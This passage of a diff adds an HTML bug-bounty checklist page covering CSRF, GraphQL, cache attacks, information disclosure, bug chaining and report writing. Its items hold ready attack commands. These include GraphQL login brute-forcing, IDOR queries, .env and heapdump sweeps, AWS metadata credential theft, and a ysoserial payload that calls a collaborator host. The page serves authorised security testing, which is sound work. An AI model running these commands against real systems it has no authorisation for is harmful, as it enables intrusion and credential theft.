+            <div class="item-top"><span class="item-title">CSRF — test every state-changing action for missing/bypassable CSRF token</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd note">Test: remove CSRF token entirely, send empty token, reuse old token, change to GET method. Does action still execute?</div>
+            <div class="item-sub">CSRF matters on: password change, email change, fund transfer, 2FA disable, account deletion, profile update.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Clickjacking — test sensitive pages with X-Frame-Options absent + no CSP frame-ancestors</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sI https://target.com/account/delete | grep -iE "x-frame-options|content-security-policy" # Missing both = clickjackable</div>
+            <div class="item-sub">Pages worth clickjacking: password change, payment confirmation, account settings, 2FA disable.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">graphql attacks</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">GraphQL introspection — map full schema, find hidden queries and mutations</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind}}}}}}"}' | python3 -m json.tool</div>
+            <div class="item-tool">GraphQL Voyager for visual schema map, InQL Burp extension for systematic testing</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">GraphQL batching attack — bypass rate limiting with array of queries</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" -d '[{"query":"mutation{login(u:\"admin\",p:\"pass1\")}"},{"query":"mutation{login(u:\"admin\",p:\"pass2\")}"},{"query":"mutation{login(u:\"admin\",p:\"pass3\")}"}]'</div>
+            <div class="item-sub">Send 1000 brute-force attempts in one HTTP request — bypasses per-request rate limiting entirely.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">GraphQL IDOR on every query with ID arguments</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/graphql -H "Authorization: Bearer USER_A_TOKEN" -d '{"query":"{ user(id: \"USER_B_ID\") { email, name, phone, billing } }"}'</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">GraphQL field-level authorization — invoke admin mutations as regular user</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/graphql -H "Authorization: Bearer USER_TOKEN" -d '{"query":"mutation { deleteUser(id:\"OTHER_USER_ID\") { success } }"}'</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Clairvoyance — field discovery when introspection is disabled</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">python3 clairvoyance.py -o schema.json -u https://target.com/graphql -H "Authorization: Bearer TOKEN" -w /usr/share/seclists/Discovery/Web-Content/graphql.txt</div>
+            <div class="item-tool">clairvoyance: pip install clairvoyance — many apps disable introspection but still expose all fields</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">web cache & smuggling</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Web cache poisoning via unkeyed headers</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Burp Param Miner → "Guess headers" on cached endpoints. Try: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL as injection vectors.</div>
+            <div class="item-sub">If X-Forwarded-Host is reflected in cached response → inject malicious host → poisoned cache served to all users.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Web cache deception — trick cache into storing auth responses</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sk "https://target.com/api/user/profile/attacker.css" -H "Cookie: session=VICTIM_SESSION" # Does cache store this and serve it unauthenticated?</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">websockets & misc</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">WebSocket security — auth bypass, injection, Cross-Site WebSocket Hijacking</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Burp WebSocket history → check if WS handshake verifies Origin header. No Origin check = CSWSH = read victim's WS data.</div>
+            <div class="item-tool">Test WebSocket messages for: SQLi, XSS, command injection, IDOR — same vulns as HTTP, often less tested</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">HTTP Parameter Pollution — duplicate params for filter bypass</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sk "https://target.com/api/orders?user_id=ATTACKER&user_id=VICTIM" -H "Authorization: Bearer TOKEN" # Which ID does server use?</div>
+            <div class="item-sub">Some parsers take first value, some take last, some concatenate — exploit the inconsistency.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check for insecure deserialization — Java, PHP, Python pickle objects in cookies/headers</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">python3 ysoserial.py -g CommonsCollections6 -a "curl http://COLLABORATOR" | base64 -w0 | tee payload.txt</div>
+            <div class="item-tool">ysoserial (Java), PHPGGC (PHP) — look for base64 blob in cookies that decodes to serialized object (rO0AB, a:1: patterns)</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check exposed Firebase/Firestore — read/write without auth</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">curl -s "https://PROJECTID.firebaseio.com/.json" && curl -s "https://firestore.googleapis.com/v1/projects/PROJECTID/databases/(default)/documents/users"</div>
+            <div class="item-sub">Find Firebase project ID in JS source or APK. Misconfigured rules = read all user data.</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. GraphQL introspection enabled, batching bypasses 2FA rate limit, CORS null origin accepted on /api/profile endpoint..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════ -->
+  <!-- PHASE 11 — Information Disclosure -->
+  <!-- ════════════════════════════ -->
+  <div class="phase" id="phase-11">
+    <div class="phase-header" onclick="togglePhase('phase-11')">
+      <div class="phase-num">PHASE 11</div>
+      <div class="phase-title">Information Disclosure</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-11"></div></div><span id="pct-phase-11">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-11">
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Force errors — wrong types, missing params, boundary values → stack traces</span></div>
+            <div class="item-cmd">curl -s -X POST https://target.com/api/user -H "Content-Type: application/json" -d '{"id":"INVALID_TYPE_STRING"}' | grep -iE "at com\.|at org\.|exception|traceback|line [0-9]"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check HTTP response headers for version info leading to CVE hunting</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -include-response-header -o headers-dump.txt && cat headers-dump.txt | grep -iE "server:|x-powered-by:|x-aspnet|x-generator"</div>
+            <div class="item-sub">Server: Apache/2.4.49 → look up CVE. X-Powered-By: PHP/7.0.1 → known RCEs exist.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Spring Boot Actuator — comprehensive endpoint sweep</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">for ep in env beans heapdump threaddump logfile loggers info mappings configprops conditions metrics httptrace; do code=$(curl -sk -o /tmp/act -w "%{http_code}" "https://target.com/actuator/$ep"); echo "$ep: $code $(wc -c < /tmp/act)bytes"; done</div>
+            <div class="item-sub">/actuator/heapdump = JVM heap memory dump. Contains plaintext passwords, keys, tokens in memory. Parse with Eclipse MAT.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Laravel Telescope, Symfony Profiler, Django Debug Toolbar</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/telescope,/telescope/requests,/_profiler,/__debug__/,/debugbar,/_debugbar" -mc 200 -o framework-debug.txt</div>
+            <div class="item-sub">Laravel Telescope in prod = all HTTP requests, queries, emails, jobs with full request/response logged.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check .env file on every subdomain — DB passwords, API keys, secrets</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/.env,.env.backup,.env.local,.env.prod,.env.staging,/.env.example" -mc 200 -sr -srd ./env-dumps/</div>
+            <div class="item-sub">Contains database passwords, API keys, app secrets. One .env = full system compromise.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">phpinfo.php and server-info — leaks full PHP config, env vars, loaded modules</span></div>
+            <div class="item-cmd">httpx -l live-subs.txt -path "/phpinfo.php,/info.php,/test.php,/php.php,/server-info,/server-status" -mc 200 -o phpinfo-results.txt</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">AWS metadata via SSRF or direct access — steal IAM credentials</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ && curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</div>
+            <div class="item-sub">Also test IMDSv2: TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">JSONP data leakage — ?callback= on authenticated endpoints bypasses CORS</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -sk "https://target.com/api/user/profile?callback=evil" -H "Cookie: session=VICTIM_TOKEN" | grep -i "evil("</div>
+            <div class="item-sub">JSONP wraps response in callback function — attacker can include as &lt;script src&gt; and read victim's data cross-origin.</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
+        <textarea class="notes-field" placeholder="e.g. /actuator/env exposed on internal API, Laravel Telescope enabled on staging with prod DB queries, .env found on legacy subdomain..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════ -->
+  <!-- PHASE 12 — Bug Chaining & Reporting -->
+  <!-- ════════════════════════════ -->
+  <div class="phase" id="phase-12">
+    <div class="phase-header" onclick="togglePhase('phase-12')">
+      <div class="phase-num">PHASE 12</div>
+      <div class="phase-title">Bug Chaining &amp; Reporting</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-12"></div></div><span id="pct-phase-12">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-12">
+
+        <div class="subsection-title">chaining for critical impact — before you report anything</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Ask: can I chain this bug with anything else? Spend 30 min trying.</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Low + Low = Critical happens constantly. Before reporting, check every chain possibility below.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Open redirect + OAuth = Account Takeover</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">Open redirect on target.com → use as OAuth redirect_uri → steal auth code → full ATO. CRITICAL severity.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">SSRF + cloud metadata = credential theft + data breach</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">SSRF → 169.254.169.254 → AWS IAM role creds → S3 access → read all customer data. CRITICAL.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">IDOR (read email) + Password reset = Account Takeover</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">IDOR leaks victim's email address → trigger password reset to that email → if you control mailbox (or reset doesn't confirm ownership) → ATO.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Subdomain takeover + parent domain cookie = session theft</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">Takeover sub.target.com → set cookie for .target.com domain → all users visiting target.com send cookie to attacker's subdomain.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Self-XSS + CSRF = Exploitable XSS</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">Self-XSS alone = N/A. Self-XSS + CSRF to force victim into the self-XSS state = HIGH severity, full account takeover.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Mass assignment + role elevation = Full admin access</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">Add role:admin to profile update → gain admin → full platform compromise. CRITICAL severity.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">XSS + missing CSRF = automated victim account takeover at scale</span><span class="tag tag-chain">Chainable</span></div>
+            <div class="item-sub">XSS payload triggers CSRF-unprotected actions (password change, email change) → ATO without any user interaction beyond page visit.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">before writing anything</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Reproduce the bug 3 times from scratch — in a fresh browser session</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">If you cannot reproduce reliably, do not submit. Unreproducible reports waste triage time and damage your reputation.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Capture full Burp HTTP request/response for every step</span></div>
+            <div class="item-cmd note">Burp → Logger++ → filter for affected endpoint → "Copy as raw HTTP" → paste in report for every step</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Record video PoC for complex bugs — IDOR, auth bypass, race conditions</span></div>
+            <div class="item-cmd">ffmpeg -f x11grab -s 1920x1080 -r 30 -i :0 -vcodec libx264 -preset fast poc-$(date +%s).mp4</div>
+            <div class="item-sub">Video eliminates all ambiguity. Triage team can reproduce in 30 seconds instead of 30 minutes.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">NEVER access real user data — only accounts you created and control</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd note">NEVER: read other users' private data, use real PII as PoC, screenshot other users' information. Legal and ethical boundary.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">writing the report</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Title: [VulnType] in [Component] allows [who] to [impact]</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd note">Good: "IDOR in /api/v2/orders/{id} allows any authenticated user to read and delete orders belonging to other accounts"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Impact: write in BUSINESS terms, quantify the damage</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Not "attacker can read data." Instead: "An attacker with a free account can access financial records of all 50,000 customers, enabling fraud and GDPR violation with fines up to 4% annual revenue."</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Steps to reproduce: numbered, exact, zero-effort to follow</span></div>
+            <div class="item-sub">Include test credentials. Include every raw HTTP request. Assume triager has NEVER used this app before. They should not need to think.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Set severity with CVSS reasoning — never just say "Critical" without justification</span></div>
+            <div class="item-cmd note">CVSS 9.1 AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N — explain: "unauthenticated, no user interaction required, full data compromise of all users"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Provide specific, actionable remediation recommendation</span></div>
+            <div class="item-cmd note">Not "add authorization." Instead: "Verify req.user.id === invoice.owner_id server-side before returning data. Never trust client-supplied resource IDs."</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check for duplicates before submitting</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">Google: site:hackerone.com "target.com" "IDOR" — nothing worse than a duplicate on a bug you spent hours finding</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">after submitting</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Respond to triager questions within 24 hours</span></div>
+            <div class="item-sub">Slow responses get deprioritized and sometimes closed as unresponsive. Be faster than every other hunter.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">If severity downgraded, rebut calmly with evidence — facts only, no emotion</span></div>
+            <div class="item-sub">One clear message with impact proof. Never argue emotionally. Provide concrete PoC showing higher impact if disputed.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">After fix deployed — retest and verify the same pattern isn't in new features</span></div>
+            <div class="item-sub">Confirm fix works. Check if partial fix introduces new bypass. Look for the same pattern in features added since the vulnerability.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Keep a hunting notes file for every program — what worked, what didn't</span></div>
+            <div class="item-cmd note">Document: interesting behaviors, untested features, response anomalies, tech stack quirks — revisit in 3 months for new bugs</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Chains Found</div>
+        <textarea class="notes-field" placeholder="e.g. Chain: SSRF in webhook + AWS metadata → leaked IAM key with S3:GetObject on customer-data bucket. Report submitted #2847392. Bounty: $5,000..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>Bug Bounty Elite Checklist v3.0 &nbsp;·&nbsp; Stay in scope. Stay ethical. Stay patient.<br>
+    <span style="color:var(--text-muted)">Built for the 0.1% who actually execute — not just read.</span></p>
+  </div>
+
+</div>
+
+<button id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+  function updateProgress() {
+    const allBoxes = document.querySelectorAll('.items-list input[type="checkbox"]');
+    const checked = document.querySelectorAll('.items-list input[type="checkbox"]:checked').length;
+    const total = allBoxes.length;
+    const pct = total ? Math.round((checked / total) * 100) : 0;
+
+    document.getElementById('globalBar').style.width = pct + '%';
+    document.getElementById('globalPct').textContent = pct + '%';
+    document.getElementById('checkedCount').textContent = checked;
+    document.getElementById('totalCount').textContent = total;
+    document.getElementById('remainCount').textContent = total - checked;
+
+    document.querySelectorAll('.items-list').forEach(list => {
+      const phaseId = list.getAttribute('data-phase');
+      const phaseBoxes = list.querySelectorAll('input[type="checkbox"]');
+      const phaseChecked = list.querySelectorAll('input[type="checkbox"]:checked').length;
+      const phaseTotal = phaseBoxes.length;
+      const pp = phaseTotal ? Math.round((phaseChecked / phaseTotal) * 100) : 0;
+      const bar = document.getElementById('bar-' + phaseId);
+      const pctEl = document.getElementById('pct-' + phaseId);
+      if (bar) bar.style.width = pp + '%';
+      if (pctEl) pctEl.textContent = pp + '%';
+    });
+
+    document.querySelectorAll('.item').forEach(item => {
+      const cb = item.querySelector('input[type="checkbox"]');
+      if (cb) item.classList.toggle('checked', cb.checked);
+    });
+
+    saveState();
+  }
+
+  function togglePhase(id) {
+    document.getElementById(id).classList.toggle('open');
+  }
+
+  function expandAll() {
+    document.querySelectorAll('.phase').forEach(p => p.classList.add('open'));
+  }
+
+  function collapseAll() {
+    document.querySelectorAll('.phase').forEach(p => p.classList.remove('open'));
+  }
+
+  function clearAll() {
+    if (!confirm('Reset ALL checkboxes and notes? This cannot be undone.')) return;
+    document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = false);
+    document.querySelectorAll('.notes-field').forEach(n => n.value = '');
+    localStorage.removeItem('bbChecklist_v3');
+    updateProgress();
+  }
+
+  function exportNotes() {
+    const phases = document.querySelectorAll('.phase');
+    let out = '# Bug Bounty Hunt Notes\n# Generated: ' + new Date().toLocaleString() + '\n\n';
+    phases.forEach(phase => {
+      const title = phase.querySelector('.phase-title').textContent;
+      const notes = phase.querySelector('.notes-field');
+      const checked = phase.querySelectorAll('input:checked').length;
+      const total = phase.querySelectorAll('input[type="checkbox"]').length;
+      out += '## ' + title + ' (' + checked + '/' + total + ' complete)\n';
+      out += (notes && notes.value.trim()) ? notes.value.trim() + '\n' : '(no notes)\n';
+      out += '\n';
+    });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([out], { type: 'text/plain' }));
+    a.download = 'bb-notes-' + Date.now() + '.txt';
+    a.click();
+  }
+
+  function saveState() {
+    const state = {};
+    document.querySelectorAll('input[type="checkbox"]').forEach((cb, i) => state['cb_' + i] = cb.checked);
+    document.querySelectorAll('.notes-field').forEach((n, i) => state['note_' + i] = n.value);
+    try { localStorage.setItem('bbChecklist_v3', JSON.stringify(state)); } catch(e) {}
+  }
+
+  function loadState() {
+    try {
+      const saved = localStorage.getItem('bbChecklist_v3');
+      if (!saved) return;
+      const state = JSON.parse(saved);
+      document.querySelectorAll('input[type="checkbox"]').forEach((cb, i) => { if (state['cb_' + i]) cb.checked = true; });
+      document.querySelectorAll('.notes-field').forEach((n, i) => { if (state['note_' + i]) n.value = state['note_' + i]; });
+    } catch(e) {}
+  }
+
+  document.addEventListener('input', e => {
+    if (e.target.classList.contains('notes-field')) saveState();
+  });
+
+  window.addEventListener('scroll', () => {
+    document.getElementById('scrollTop').classList.toggle('visible', window.scrollY > 400);
+  });
+
+  loadState();
+  updateProgress();
+</script>
+</body>
+</html>
